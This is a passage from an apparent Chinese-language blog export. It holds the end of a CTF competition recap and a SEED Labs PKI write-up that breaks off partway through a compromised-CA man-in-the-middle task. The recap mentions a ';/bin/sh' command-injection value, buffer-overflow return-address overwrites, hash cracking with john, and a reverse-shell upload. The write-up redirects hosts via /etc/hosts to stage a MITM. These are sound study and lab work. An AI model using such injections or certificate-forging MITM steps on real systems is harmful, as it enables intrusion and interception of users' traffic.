遇到空白字元會停止接收輸入，後面的東西就讀不到了；但這可以解決，比如前面提及的 ';/bin/sh 直接抓一個 shell 就好，不過那就是第二個問題，會遇到說 termination character 而出錯，這題就卡在這邊看很久沒下文\n第二題是更經典的 buffer overflow，題目一樣 scanf(\u0026quot;%s\u0026quot;, buf) 給我輸入，但目標是要跳到一個同份檔案存在的 win() 函式，簡單來說我要把 scanf() 的 return address 改成 win() 的位置就可以解出這題，阿為什麼沒解出來？好啦！下禮拜開始回去資安攻防演練重上一次課\nRev 有四題，環境提供 ida free 和 ghidra 可以玩\n第一題是 flag checker，但我用 strings 跑下去 flag 就出來了，那就這樣吧！不過還是仔細說一下這題，我沒有特別去逆這題的邏輯，但因為 strings 有東西，表示裡面邏輯應該是 if(input == flag)，總之 CTF += 3\n第二題是加密，需要我們逆向邏輯去解 flag，第三題沒特別看，但這兩題都沒去解\n來到第四題，這次是 html 不是執行檔耶！題目叫做 magic number，提供了一個很像計算機的東西，要我輸入六位數字 (000000 到 999999)，如果猜對會把 flag 告訴我，嗯\u0026hellip; Web 這種的應該 F12 下去看原始碼就好，裡面 script 說到會把 user 輸入的六位數字字串丟去 sha1 跑出 hash 值，hash 後的結果比對相符就會往下解出 flag，程式碼有了，邏輯都有了，寫個腳本去跑就好，那問題是什麼？我寫了一個 javascript 腳本從 000000 跑到 999999，一個一個去試有沒有 match 到的 hash value，如果有我讓他停下來 alert() 跟我說，阿沒錯就是 brute force 解，我覺得 區區 10^6 一百萬種可能性，對眼前這台兩年前教育部整體發展獎補助的 ASUS ProArt PD500TC Intel Core i7 RTX 3060（再鞭會被萬能的萬能科大抓去約談）怎麼可能是問題，嗯結果 VM 被我玩壞了讓我重開一次，可能主辦方沒開很高的資源給 VM？其實測試的時候我很怕技術顧問海豹在我後面突然出現說「這位選手你再這樣破壞競賽環境就剔除資格喔」，這題剛好也在滿後期才解的，還是以失敗告終。其實如果回到 terminal 拿 python 出來寫，說不定可以寫很快，但我競賽當下不太確定 python 要跑這些邏輯確切的語法怎麼寫，比如說 python 裡面的 sha1 是不是需要 Crypt 函式庫，要的話環境有沒有允許，或是用 shell script 跑，但一樣 sha1 怎麼跑？\nWeb 有三題，一樣不是什麼難題，經典的 php injection、資料庫注入和 MD5 decrypt\n第一題是留言板，檢視原始碼發現讀取留言板內文的邏輯是透過 PHP 語句渲染 HTML，表示我可以從中寫入壞壞的 PHP 取得 flag，好一個 PHP 我還不會\n第二題要先輸入帳號密碼，很明顯就資料庫的洞，為什麼不說 SQL injection，因為測試後發現應該不是拿 SQL 寫的，CTF 賽結束後聽旁邊選手交流似乎是 NoSQL，好吧！那我認了\n最後一題一樣要先輸入一個 secret 登入後，可以存取一個上傳文件的頁面，所以應該是複合式題目，後面還要做一個 reverse shell 上傳，後話就不談了，先來說 secret 怎麼得到，題目給一個 hint 說 MD5 後的值，ㄟ MD5？那就是弱密碼 john 一下囉？我記得 rockyou 是海豹比的那一年最後讓他們獲勝的一個小關鍵，如果這次出題跟他們有關係，那就是 john 了！我超級開心的把 MD5 hash value 抓下來丟到 terminal 上拿 rockyou john，結果破解不出來，一度還想是不是我一直忘記 john 的用法，甚至跑了 admin 的 MD5 hash value 測試，但就可以破解的開，表示不是指令問題，那就\u0026hellip;？這題卡在這關就先結束了\n整體來說 CTF 難嗎？不難啊絕對不難！Pwn 那種題目有基本概念解一下絕對不是問題，rev 題二三沒看姑且不說，第四題會寫腳本跑一下就結束了，Web 看的到洞應該就可以解出來，跟以往國內 CTF 比賽相比是很親民了\n心得 \u0026amp;\u0026amp; 致謝 # 雖然說止步於分區賽，但目標算是達到了。這次經歷絕對絕對不能說是毫無收穫，因為三個月的準備歷程比之前任何一次資安競賽都還要盡力，CTF、靶機也打得比之前兇\n人生第一次的技能競賽，倉促的組隊、報名，很多東西都是靠著兩個學生的手邊資源慢慢摸索得到，去年年底報名完，到寒假開始準備，寒假會乖乖寫 CTF，把 pico CTF 的 easy 都完成，從 medium 開始只要有解出來就寫 writeup，開學之後針對技能競賽的歷屆學習新技能，安全強化從熟悉的 Linux 開始，學到 ACL 的概念、iptables 也再次理解，怕正式賽出憑證，還回去看 SEED LAB PKI 的 lab 搞懂 openssl 的指令和邏輯；Windows 則是在 AWS 上開了一台 Windows Server 2022，花了幾天的時間嘗試密碼原則、users、groups 的設定；鑑識比較晚開始，但也是學習了 volatility，也玩了一些 memory forensic 的 labs，不確定會不會有特別的鑑識，在 pico CTF 上也特別著重在鑑識題目的訓練，認識一堆圖片鑑識的工具，什麼 zsteg、steghide 等等，也為了應對技能競賽的 CTF，在正式賽前兩三禮拜順便參加了 pico CTF 2025，維持刷 CTF 的手感\n當然要謝謝跟我一起參加比賽的 Ray，在資安圈 Ray 絕對是新手，結果就被我抓來一個技能點要求極高的活動，競賽兩天從新北大老遠到超偏僻的萬能科大（萬能科大不排除提告），希望這三個月不會讓你對資安打退堂鼓\n下一個要感謝的應該是上學期高等資安攻防演練課程整整 16 週遇到的種種，因為那堂課讓我正式接觸到滲透、攻擊鏈這些更進階的知識，雖然從那堂課之後進展差不多就是認識了一些新名詞，有沒有真的搞懂、甚至會活用是另一個問題，但比起甚麼都不懂，「這個名詞好像有聽過」好很多，至少知道可能成長進步學習的方向\n最後給想參加技能競賽而且花時間讀到這裡的讀者一些不專業建議，畢竟網路上有寫技能競賽準備過程、心得或 writeups 的不像一般 CTF 一樣關鍵字下一下就跑出一堆\n[報名] 技能競賽報名時間很短，確定要比賽之後一定要隨時關注官網，簡章時程也要全部先列進去行事曆，根據大前輩 Mico 說最難的關卡就是報名，過了這關已經贏過很多人了 [報名] 一定要注意郵局關門時間和學校用印時間，最好預留兩天跑流程，當初為了讓報名表給學校用印還需要找系主任和學院院長簽名，這關就卡了一天（尤其當你要找人時，那個人一定剛好不在） [報名] 技能競賽需要有培訓單位，以學生來說就是學校，但需要找一個老師作為指導老師，這個需要先找，同時也表示不能玩玩而已，畢竟掛了學校和老師的名字 [報名] 網路安全組需要兩人組一隊，所以找一個可靠的隊友也需要事前準備 [報名] 政府主辦的活動，聯繫方式只有電話，mail 什麼的找不到 [報名] 需要準備 400 塊，但以今年分區賽來說拿到小禮物和三份餐盒一份便當，應該是賺吧？ [準備] 最好的準備方式就是跟著歷屆準備，考點很明確，可以從裡面學習到需要的技能 [準備] 事前公布的工具表也是準備方向之一，至少要熟悉裡面提到的工具，版本可能是需要考量的因素，像是今年 volatility 給 2.6 版，但現在比較多都用 3.0 版本，因為 2.6 版是用 Python2 在跑，現在誰還在 Python2？為了環境問題也是處理了好一陣子 [競賽] 不能連外網、不能連外網、不能連外網，這點最重要，大多數網路安全競賽都是網路吃到飽，但技能競賽不允許連網，所以很考驗選手各方面知識廣度 [競賽] 呈上一點，網路安全有一個 partner，不完全要求一定要當全能的神，所以「分工」顯得很重要，好的分工可以減輕準備的負擔 [競賽] 這次 CTF 有提供 Cyberchef，但不能保證一定會提供，可以先準備如何使用 command line、各種程式語言做各種 encode, decode [競賽] 賽後記得留下來聽裁判講評，會說一些出題者策略、希望選手學到的技能，或許會被點出一些還可以嘗試、學習的方向 [心態] 參加競賽一定會想要拿到一個名份，但記得在過程中嘗試理解「主辦方想要透過競賽告訴你什麼」，每個出題者在出題時通常都會去想希望答題者怎麼解題，需要用到什麼觀念，某種程度上跟著出題者的設計走完全程一定會是收穫滿滿的 ","date":"2025-04-01","externalUrl":null,"permalink":"/posts/ws-2025/","section":"Blog Posts","summary":"","title":"網路安全技能競賽 - 分區賽紀錄","type":"posts"},{"content":" Motivation # 公開金鑰加密是當前通訊安全的基礎，但在雙方傳送公開金鑰時，也成為中間人攻擊的目標之一，其根本的問題在於 驗證公開金鑰的擁有者 不是件容易的事情，換句話說，如何驗證送過來的公開金鑰就如它聲稱的是來自於該擁有者，而 公開金鑰基礎設施 (Public Key Infrastructure, PKI) 就是此問題的有效解法\nLab Environment # Get Corresponding Files # 至 Seed Labs 2.0 \u0026gt; Crypto \u0026gt; PKI Lab 下載相關檔案，包含 [題目說明] (https://seedsecuritylabs.org/Labs_20.04/Files/Crypto_PKI/Crypto_PKI.pdf )與 lab 環境 DNS Set Up # 在這個 lab 當中，會以 www.bank32.com 作為設定 HTTPS server 的範例，因此需特別針對 DNS 做設定\n# 打開 /etc/hosts，新增下面一行資訊 [02/13/25]seed@VM:~/.../SEEDLAB-PKI$ sudo vim /etc/hosts 10.9.0.80 www.bank32.com Lab Tasks # Task 1: Becoming a Certificate Authority (CA) # :::success 憑證管理中心、憑證頒發機構 (Certificate Authority, CA) 是具公信力第三方，可對個人及機關團體提供認證及憑證簽發管理等服務，而數位憑證 (digital certificates) 可以用來證明一把公開金鑰的擁有性。有些商業類型的 CAs 被稱作根憑證頒發機構 (root CAs)，例如 VeriSign ，一般用戶可以透過 CA 獲取數位憑證，而 CA 的憑證可能是由另一間 CA 所頒發，不斷追溯源頭就會找到一間最大的 CA，即 root CA，而 root CA 的憑證是自行頒發的 (self-signed)，也理所當然的被相信，通常 root CA 憑證都是先裝在大多數的作業系統、網路瀏覽器或其他需要 PKI 的軟體\n這個 task 的目標就是假扮 root CA 產生一張數位憑證，並在之後的 task 頒發憑證給其他 server :::\n要使用 OpenSSL 產生憑證會需要一份設定檔 (configuration file)，通常設定檔會以 .cnf 後綴結尾，供三個 OpenSSL 指令所使用： ca, req 以及 x509。預設上 OpenSSL 會使用 /usr/lib/ssl/openssl.cnf 作為設定檔，但因為我會需要對它做一些修正，所以先將它複製到當前目錄，並告訴 OpenSSL 要使用這份新的配置檔。\n在配置檔中的預設設定提到，所有東西會放在 ./demoCA 底下，頒發的 certs 會放在 $dir/certs，頒發的 crl 會放在 $dir/crl，新憑證會放在 $dir/newcerts，index file 的資料庫為 $dir/index.txt，serial number 會放在 $dir/derial 中。因此先根據上述設定建立環境\n# 把預設的 conf 檔從 /usr/lib/ssl/openssl.cnf 複製過來，重新命名成 myCA_openssl.cnf [02/13/25]seed@VM:~/.../SEEDLAB-PKI$ cp /usr/lib/ssl/openssl.cnf myCA_openssl.cnf # 創建資料夾 demoCA [02/13/25]seed@VM:~/.../SEEDLAB-PKI$ mkdir demoCA # 進到 demoCA [02/13/25]seed@VM:~/.../SEEDLAB-PKI$ cd demoCA/ # 再創建三個資料夾 certs, crl 和 newcerts [02/13/25]seed@VM:~/.../demoCA$ mkdir certs crl newcerts # 創建兩個空白檔案 index.txt 和 serial [02/13/25]seed@VM:~/.../demoCA$ touch index.txt serial # serial 裡面要放 serial number，假設放 1000 [02/13/25]seed@VM:~/.../demoCA$ echo 1000 \u0026gt; serial 又因為這個 lab 可能會對同一個 subject 創建很多次憑證，所以需要特別把 #unique_subject = no 這行取消註解\n# 編輯 myCA_openssl.cnf，將 unique_subject = no 那行取消註解 [02/13/25]seed@VM:~/.../SEEDLAB-PKI$ vim myCA_openssl.cnf # 節錄 myCA_openssl.cnf 內容 [ CA_default ] dir\t= ./demoCA\t# Where everything is kept certs\t= $dir/certs\t# Where the issued certs are kept crl_dir\t= $dir/crl\t# Where the issued crl are kept database\t= $dir/index.txt\t# database index file. unique_subject\t= no\t# Set to \u0026#39;no\u0026#39; to allow creation of # several certs with same subject. new_certs_dir\t= $dir/newcerts\t# default place for new certs. certificate\t= $dir/cacert.pem # The CA certificate serial\t= $dir/serial # The current serial number crlnumber\t= $dir/crlnumber\t# the current crl number # must be commented out to leave a V1 CRL crl\t= $dir/crl.pem # The current CRL private_key\t= $dir/private/cakey.pem# The private key x509_extensions\t= usr_cert\t# The extensions to add to the cert 完成設定檔後，即可透過 openssl 指令產生憑證，又因為這個 lab 是假設為 root CA，因此簽出來的憑證會是自簽憑證，指令如下\n# 使用以下指令產生憑證 [02/13/25]seed@VM:~/.../SEEDLAB-PKI$ openssl req -x509 -newkey rsa:4096 -sha256 -days 3650 -keyout ca.key -out ca.crt -subj \u0026#34;/CN=www.modelCA.com/O=Model CA LTD./C=US\u0026#34; -passout pass:dees Generating a RSA private key ....................................................................................................................................................................................................................++++ .......................................++++ writing new private key to \u0026#39;ca.key\u0026#39; ----- 指令、參數 說明 openssl req 向 root CA 發送憑證簽署要求或自前憑證 -x509 告訴 OpenSSL 這是自簽憑證，而不是簽給別人 -newkey rsa:4096 產生一組大小為 4096 bits 用來簽署憑證的 RSA key-pair -sha256 指定要用 sha256 簽署該憑證 -days 3650 設定有效日期為 3650 天 -keyout ca.key CA private key 儲存於 ca.key 中 -out ca.crt 公鑰憑證 (public key certificate) 存放於 ca.crt 中 -subj \u0026quot;/CN=www.modelCA.com/O=Model CA LTD./C=US\u0026quot; subject information/CN: Common Name/O: Organization/C: Country -passout pass:dees 密碼，每次使用此 CA 為他人簽憑證時都需輸入一次 可以透過以下指令查看憑證\n[02/13/25]seed@VM:~/.../SEEDLAB-PKI$ openssl x509 -in ca.crt -text -noout Certificate: Data: Version: 3 (0x2) Serial Number: 74:cd:b2:fb:e0:15:b2:1f:12:e1:4a:41:39:8d:7b:31:26:9f:b8:44 Signature Algorithm: sha256WithRSAEncryption Issuer: CN = www.modelCA.com, O = Model CA LTD., C = US Validity Not Before: Feb 13 07:38:24 2025 GMT Not After : Feb 11 07:38:24 2035 GMT Subject: CN = www.modelCA.com, O = Model CA LTD., C = US Subject Public Key Info: Public Key Algorithm: rsaEncryption RSA Public-Key: (4096 bit) Modulus: 00:e4:6f:76:32:94:48:4d:c4:e1:18:23:d9:c7:cb:... Exponent: 65537 (0x10001) X509v3 extensions: X509v3 Subject Key Identifier: A5:E9:74:99:52:6F:A3:D7:0E:8A:A6:C1:F6:E6:24:5B:BE:C6:A4:03 X509v3 Authority Key Identifier: keyid:A5:E9:74:99:52:6F:A3:D7:0E:8A:A6:C1:F6:E6:24:5B:BE:C6:A4:03 X509v3 Basic Constraints: critical CA:TRUE Signature Algorithm: sha256WithRSAEncryption 03:e3:a7:4f:b2:e2:6b:df:66:f0:bc:32:1d:3d:c1:25:fb:e3:... 指令、參數 說明 openssl x509 告訴 OpenSSL 要解讀 X509 憑證 -in ca.crt 指定 input file -text 以人類讀得懂的方式顯示該憑證的完整資訊包含擁有者 (Subject) 資訊、發佈人資訊、驗證期限、公鑰資訊、簽章所用演算法等等 -noout 不要顯示 base64 編碼版本如果沒加這行則會同時印出編碼版與文字版 另外，可以透過以下指令查看私鑰\n[02/13/25]seed@VM:~/.../SEEDLAB-PKI$ openssl rsa -in ca.key -text -noout Enter pass phrase for ca.key: RSA Private-Key: (4096 bit, 2 primes) modulus: 00:e4:6f:76:32:94:48:4d:c4:e1:18:23:d9:c7:cb:... publicExponent: 65537 (0x10001) privateExponent: 00:84:df:d4:e7:fc:da:c5:e9:d4:68:ff:49:89:6e:... prime1: 00:f4:53:7e:98:01:5e:0d:f3:86:90:c1:4c:bd:5f:... prime2: 00:ef:59:98:f5:44:32:bf:8f:ad:43:8d:21:8a:e4:... exponent1: 0d:71:82:a7:ae:7b:94:5c:ef:ec:8b:16:43:dd:38:... exponent2: 00:80:cb:d3:f5:57:67:7f:91:8f:08:e4:af:02:10:... coefficient: 00:8f:2f:26:4b:4e:27:5f:bf:17:39:fe:e4:3f:1f:... 指令、參數 說明 openssl rsa 告訴 OpenSSL 要做與 RSA 私鑰相關的事情 -in ca.key 指定 input file -text 以人類讀得懂的方式顯示該憑證的完整資訊包含私鑰組成以及公鑰推導等等 -noout 不要顯示 base64 編碼版本如果沒加這行則會同時印出編碼版與文字版 What part of the certificate indicates this is a CA’s certificate? CA:TRUE\nWhat part of the certificate indicates this is a self-signed certificate? Issuer 與 Subject 皆相同\nIn the RSA algorithm, we have a public exponent e, a private exponent d, a modulus n, and two secret numbers p and q, such that n = pq. Please identify the values for these elements in your certificate and key files. 參數 值 e ca.crt 中的 Exponentca.key 中的 publicExponent d ca.key 中的 privateExponent n ca.crt 中的 Modulusca.key 中的 Modulus p ca.key 中的 prime1 q ca.key 中的 prime2 Task 2: Generating a Certificate Request for Your Web Server # 接下來要幫一間叫做 bank32.com 的公司簽憑證，流程是 bank32.com 發送一個憑證簽署請求 (Certificate Signing Request, CSR)，CSR 會被送到 CA 那邊，再由 CA 驗證提交的身分資訊是否正確，最後產生憑證。在 Task 2 中，會模擬 bank32.com 發送 CSR 至 CA 端\n與 Task 1 十分類似，只是這次不需要加上 -x509，因為這次不是自簽憑證\n[02/13/25]seed@VM:~/.../SEEDLAB-PKI$ openssl req -newkey rsa:2048 -sha256 -keyout server.key -out server.csr -subj \u0026#34;/CN=www.bank32.com/O=Bank32 Inc./C=US\u0026#34; -passout pass:dees Generating a RSA private key .....................................................................+++++ ......................+++++ writing new private key to \u0026#39;server.key\u0026#39; ----- 查看一下 CSR\n[02/13/25]seed@VM:~/.../SEEDLAB-PKI$ openssl req -in server.csr -text -noout Certificate Request: Data: Version: 1 (0x0) Subject: CN = www.bank32.com, O = Bank32 Inc., C = US Subject Public Key Info: Public Key Algorithm: rsaEncryption RSA Public-Key: (2048 bit) Modulus: 00:c9:fc:7a:a2:0e:c3:f8:a1:4c:b6:ee:1c:c9:07:... Exponent: 65537 (0x10001) Attributes: a0:00 Signature Algorithm: sha256WithRSAEncryption 28:78:1e:30:e9:ff:21:48:6a:cb:26:4c:d0:98:ca:48:9a:38:... 不過現今很多網站會有不同的 URL，但都可以連到同一個伺服器，這是因為瀏覽器的 hostname matching policy，可以透過 X509 的延伸套件 (extension) Subject Alternative Name (SAN) 幫主機指定不同 URL 別名，如此提交的 CSR 就會告訴 CA 這些別名都可以使用\n這邊要透過指令 -addext \u0026quot;subjectAltName = DNS:\u0026lt;URL\u0026gt;\u0026quot; 做到，不過需要注意 subjectAltName 中還是必須包含 common name (CN)，否則 CN 會變成 invalid name\n[02/13/25]seed@VM:~/.../SEEDLAB-PKI$ openssl req -newkey rsa:2048 -sha256 -keyout server.key -out server.csr -subj \u0026#34;/CN=www.bank32.com/O=Bank32 Inc./C=US\u0026#34; -passout pass:dees -addext \u0026#34;subjectAltName = DNS:www.bank32.com, DNS:www.bank32A.com, DNS:www.bank32B.com\u0026#34; Generating a RSA private key .................+++++ ....+++++ writing new private key to \u0026#39;server.key\u0026#39; ----- 查看一下更新後的 CSR，就看到有多一段 Requested Extension 指出 URL alias\n[02/13/25]seed@VM:~/.../SEEDLAB-PKI$ openssl req -in server.csr -text -noout Certificate Request: Data: Version: 1 (0x0) Subject: CN = www.bank32.com, O = Bank32 Inc., C = US Subject Public Key Info: Public Key Algorithm: rsaEncryption RSA Public-Key: (2048 bit) Modulus: 00:ec:2a:5a:ac:70:e0:f6:99:20:e0:22:17:cd:f7:... Exponent: 65537 (0x10001) Attributes: Requested Extensions: X509v3 Subject Alternative Name: DNS:www.bank32.com, DNS:www.bank32A.com, DNS:www.bank32B.com Signature Algorithm: sha256WithRSAEncryption 20:ae:80:70:aa:ad:e5:b7:23:62:2f:c8:c5:04:60:34:37:44:... Task 3: Generating a Certificate for your server # 延續 Task 2，在 Task 3 中，要扮演回 CA 的角色，拿著 CSR 幫助 bank32.com 產生憑證。\n要注意的是，因為安全性的考量，OpenSSL 預設不讓 openssl ca 從 request 中複製 extension field 至最終的憑證，但這次先把這個預設打開，從 myCA_openssl.cnf 中取消註解 # copy_extensions = copy\n# 編輯 myCA_openssl.cnf，將 copy_extensions = copy 那行取消註解 [02/13/25]seed@VM:~/.../SEEDLAB-PKI$ vim myCA_openssl.cnf # 節錄 myCA_openssl.cnf 內容 [ CA_default ] dir\t= ./demoCA\t# Where everything is kept certs\t= $dir/certs\t# Where the issued certs are kept crl_dir\t= $dir/crl\t# Where the issued crl are kept database\t= $dir/index.txt\t# database index file. unique_subject\t= no\t# Set to \u0026#39;no\u0026#39; to allow creation of # several certs with same subject. new_certs_dir\t= $dir/newcerts\t# default place for new certs. certificate\t= $dir/cacert.pem # The CA certificate serial\t= $dir/serial # The current serial number crlnumber\t= $dir/crlnumber\t# the current crl number # must be commented out to leave a V1 CRL crl\t= $dir/crl.pem # The current CRL private_key\t= $dir/private/cakey.pem# The private key x509_extensions\t= usr_cert\t# The extensions to add to the cert # Comment out the following two lines for the \u0026#34;traditional\u0026#34; # (and highly broken) format. name_opt = ca_default\t# Subject Name options cert_opt = ca_default\t# Certificate field options # Extension copying option: use with caution. copy_extensions = copy 接著透過下面的指令產生憑證\n[02/13/25]seed@VM:~/.../SEEDLAB-PKI$ openssl ca -config myCA_openssl.cnf -policy policy_anything -md sha256 -days 3650 -in server.csr -out server.crt -batch -cert ca.crt -keyfile ca.key Using configuration from myCA_openssl.cnf Enter pass phrase for ca.key: Check that the request matches the signature Signature ok Certificate Details: Serial Number: 4096 (0x1000) Validity Not Before: Feb 13 09:25:04 2025 GMT Not After : Feb 11 09:25:04 2035 GMT Subject: countryName = US organizationName = Bank32 Inc. commonName = www.bank32.com X509v3 extensions: X509v3 Basic Constraints: CA:FALSE Netscape Comment: OpenSSL Generated Certificate X509v3 Subject Key Identifier: A7:DB:BB:3C:41:57:FD:0F:32:07:B5:25:71:5C:C1:C4:C6:CE:CF:D5 X509v3 Authority Key Identifier: keyid:A5:E9:74:99:52:6F:A3:D7:0E:8A:A6:C1:F6:E6:24:5B:BE:C6:A4:03 X509v3 Subject Alternative Name: DNS:www.bank32.com, DNS:www.bank32A.com, DNS:www.bank32B.com Certificate is to be certified until Feb 11 09:25:04 2035 GMT (3650 days) Write out database with 1 new entries Data Base Updated 指令、參數 說明 openssl ca 告訴 OpenSSL 現在要簽核一張 CSR -config myCA_openssl.cnf 告訴 OpenSSL 使用 myCA_openssl.cnf 這個設定檔 -policy policy_anything 指定憑證使用的政策policy_anything 在 myCA_openssl.cnf 中有提及 -md sha256 使用 sha256 簽署憑證 -days 3650 設定有效日期為 3650 天 -in server.csr 指定 input CSR 為 server.csr -out server.crt 指定產出的憑證名為 server.crt -batch 執行 batch mode，這樣就不會中途停下來要求手動許可簽屬程序 -cert ca.crt 指定使用 CA 的憑證 ca.crt 簽署 CSR -keyfile ca.key 使用 ca.key 作為 CA 的私鑰簽署 CSR 確認簽署的憑證，應該包含 CSR 中指定的 DNS alias\n[02/13/25]seed@VM:~/.../SEEDLAB-PKI$ openssl x509 -in server.crt -text -noout Certificate: Data: Version: 3 (0x2) Serial Number: 4096 (0x1000) Signature Algorithm: sha256WithRSAEncryption Issuer: CN = www.modelCA.com, O = Model CA LTD., C = US Validity Not Before: Feb 13 09:25:04 2025 GMT Not After : Feb 11 09:25:04 2035 GMT Subject: C = US, O = Bank32 Inc., CN = www.bank32.com Subject Public Key Info: Public Key Algorithm: rsaEncryption RSA Public-Key: (2048 bit) Modulus: 00:ec:2a:5a:ac:70:e0:f6:99:20:e0:22:17:cd:f7:... Exponent: 65537 (0x10001) X509v3 extensions: X509v3 Basic Constraints: CA:FALSE Netscape Comment: OpenSSL Generated Certificate X509v3 Subject Key Identifier: A7:DB:BB:3C:41:57:FD:0F:32:07:B5:25:71:5C:C1:C4:C6:CE:CF:D5 X509v3 Authority Key Identifier: keyid:A5:E9:74:99:52:6F:A3:D7:0E:8A:A6:C1:F6:E6:24:5B:BE:C6:A4:03 X509v3 Subject Alternative Name: DNS:www.bank32.com, DNS:www.bank32A.com, DNS:www.bank32B.com Signature Algorithm: sha256WithRSAEncryption df:0b:02:78:52:d2:b8:9e:d7:23:56:1e:b5:11:81:ac:40:a6:... Task 4: Deploying Certificate in an Apache-Based HTTPS Website # Task 4 要實際將產生的憑證放入瀏覽器中，使其能夠辨識並使用 HTTPS 安全瀏覽信任的網頁。概念上來說，對於 CA 而言，需要將先前產生的憑證 ca.crt 提交給瀏覽器，跟瀏覽器說我相信這個 CA 簽出來的憑證；對 bank32 這間公司而言，瀏覽器會跟它要屬於它的憑證，即 server.crt，又因為 server.crt 是 CA 簽出來的，所以瀏覽器會相信，並讓用戶成功瀏覽 https://www.bank32.com 網頁。\n這個 task 會需要建置基於 HTTPS 的 apache server，Seed lab 已經將它安裝於 container，只需要根據先前 tasks 產生的內容作一些設定上的調整即可\n第一個是要修改 apache server 的設定檔，位於 image_www/bank32_apache_ssl.conf，需要調整 bank32 的資訊，包含 SSLCertificateFile 會從 /certs/server.crt 抓，相似地，SSLCertificateKeyFile 會從 /certs/server.key 取得，結果如下：\n\u0026lt;VirtualHost *:443\u0026gt; DocumentRoot /var/www/bank32 ServerName www.bank32.com ServerAlias www.bank32A.com ServerAlias www.bank32B.com ServerAlias www.bank32W.com DirectoryIndex index.html SSLEngine On SSLCertificateFile /certs/server.crt SSLCertificateKeyFile /certs/server.key \u0026lt;/VirtualHost\u0026gt; \u0026lt;VirtualHost *:80\u0026gt; DocumentRoot /var/www/bank32 ServerName www.bank32.com DirectoryIndex index_red.html \u0026lt;/VirtualHost\u0026gt; # Set the following gloal entry to suppress an annoying warning message ServerName localhost 接著是 Dockerfile，建置 container 時要把 server.crt 和 server.key 複製到 container 的 /certs/ 中\nFROM handsonsecurity/seed-server:apache-php ARG WWWDIR=/var/www/bank32 COPY ./index.html ./index_red.html $WWWDIR/ COPY ./bank32_apache_ssl.conf /etc/apache2/sites-available COPY ./certs/server.crt ./certs/server.key /certs/ RUN chmod 400 /certs/server.key \\ \u0026amp;\u0026amp; chmod 644 $WWWDIR/index.html \\ \u0026amp;\u0026amp; chmod 644 $WWWDIR/index_red.html \\ \u0026amp;\u0026amp; asenmod ssl \\ \u0026amp;\u0026amp; a2ensite bank32_apache_ssl CMD tail -f /dev/null 根據上面調整的內容，把 server.crt 以及 server.key 移到 image_www/certs/ 中\n使用 dcbuild 建置環境，並以 dcup 將 container 啟動\n[02/14/25]seed@VM:~/.../SEEDLAB-PKI$ dcbuild Building web-server Step 1/7 : FROM handsonsecurity/seed-server:apache-php ---\u0026gt; 2365d0ed3ad9 Step 2/7 : ARG WWWDIR=/var/www/bank32 ---\u0026gt; Using cache ---\u0026gt; 16a0763ac43d Step 3/7 : COPY ./index.html ./index_red.html $WWWDIR/ ---\u0026gt; Using cache ---\u0026gt; 718a24968c38 Step 4/7 : COPY ./bank32_apache_ssl.conf /etc/apache2/sites-available ---\u0026gt; Using cache ---\u0026gt; 844a04cc06cf Step 5/7 : COPY ./certs/server.crt ./certs/server.key /certs/ ---\u0026gt; d81c4562174e Step 6/7 : RUN chmod 400 /certs/server.key \u0026amp;\u0026amp; chmod 644 $WWWDIR/index.html \u0026amp;\u0026amp; chmod 644 $WWWDIR/index_red.html \u0026amp;\u0026amp; a2ensite bank32_apache_ssl ---\u0026gt; Running in 6e1c1867ea71 Enabling site bank32_apache_ssl. To activate the new configuration, you need to run: service apache2 reload Removing intermediate container 6e1c1867ea71 ---\u0026gt; 7ed73be4cc19 Step 7/7 : CMD tail -f /dev/null ---\u0026gt; Running in a8c9a1796b6f Removing intermediate container a8c9a1796b6f ---\u0026gt; 362809e7726b Successfully built 362809e7726b Successfully tagged seed-image-www-pki:latest [02/14/25]seed@VM:~/.../SEEDLAB-PKI$ dcup -d Creating network \u0026#34;net-10.9.0.0\u0026#34; with the default driver Creating www-10.9.0.80 ... done 透過 dockps 可查看 container ID，以 docksh \u0026lt;id\u0026gt; 連線進去\n[02/14/25]seed@VM:~/.../SEEDLAB-PKI$ dockps 0cc4d835efca www-10.9.0.80 [02/14/25]seed@VM:~/.../SEEDLAB-PKI$ docksh 0c root@0cc4d835efca:/# 進到 container 後，要開啟 apache service，使用指令 service apache2 start，它會要求輸入 server.key 的密碼，密碼為 dees\nroot@0cc4d835efca:/# service apache2 start * Starting Apache httpd web server apache2 Enter passphrase for SSL/TLS keys for www.bank32.com:443 (RSA): * root@0cc4d835efca:/# 打開 firefox 瀏覽器，嘗試連線 https://www.bank32.com ，會發現還是無法連線，這是因為我們還沒告知瀏覽器我們的 CA 是可以信任的 在網址列輸入 about:preferences#private，找到憑證的區域，點擊 View Certificate 在 Authorities 標籤內，點擊 Import 匯入 ca.crt 這張憑證 這邊要選擇 \u0026ldquo;Trust this CA to identify websites\u0026rdquo;，這樣瀏覽器就會信任這個 CA 所頒發的憑證的網站 重新瀏覽 https://www.bank32.com ，看到綠色的 Hello World 代表成功連線 Task 5: Launching a Man-In-The-Middle Attack # Task 5 會說明 PKI 可以阻擋中間人攻擊，先簡單說明這個 Task 的攻擊場景：接下來有三個人物：用戶 (Alice)、中間人 (MITM)、伺服器 (server)，Alice 打算使用 server 的服務，MITM 打算從中作梗，讓 Alice 存取的服務有問題，在這個 task 中，假設 server 是師大資工 www.csie.ntnu.edu.tw ，Alice 想要瀏覽該網頁，而中間人（也就是自己）打算將該網站導到別的地方，如果成功導向其他地方，那代表 MITM 攻擊成功，否則表示 PKI 成功阻擋了 MITM 攻擊。\n接著要思考如何進行攻擊，有兩個方法可以做到，一個是直接攻擊路由，另一個方法是攻擊 DNS，這個 task 中會以後者作為範例。假設中間人有方法修改 Alice 本機上的 /etc/hosts（VM 上的 /etc/hosts/），並新增 10.9.0.80 www.csie.ntnu.edu.tw，如此當 Alice 瀏覽 https://www.csie.ntnu.edu.tw 時，就會被導到 10.9.0.80，也就是 MITM 自架的服務\n[02/14/25]seed@VM:~/.../SEEDLAB-PKI$ sudo vim /etc/hosts 10.9.0.80 www.csie.ntnu.edu.tw 打開 firefox 瀏覽器，嘗試連線 https://www.csie.ntnu.edu.tw ，會發現並沒有如 Task 4 一樣顯示綠色的 Hello World 頁面，表示 PKI 有成功擋下 MITM 攻擊 進到 Task 6 之前稍微說明一下原因：原因就是因為 https://www.csie.ntnu.edu.tw 並無法提交合格的憑證，所以 PKI 將它擋了下來\nTask 6: Launching a Man-In-The-Middle Attack with a Compromised CA # Task 6 就是要幫假服務偽造假憑證，使 MITM 攻擊成功，過程基本上就是仿造 Task 1-4\n首先建立向 CA 發出憑證簽署要求的 CSR (ntnu.csr) 及私鑰 (ntnu.key)，再讓 CA 簽署該 CSR，產生憑證 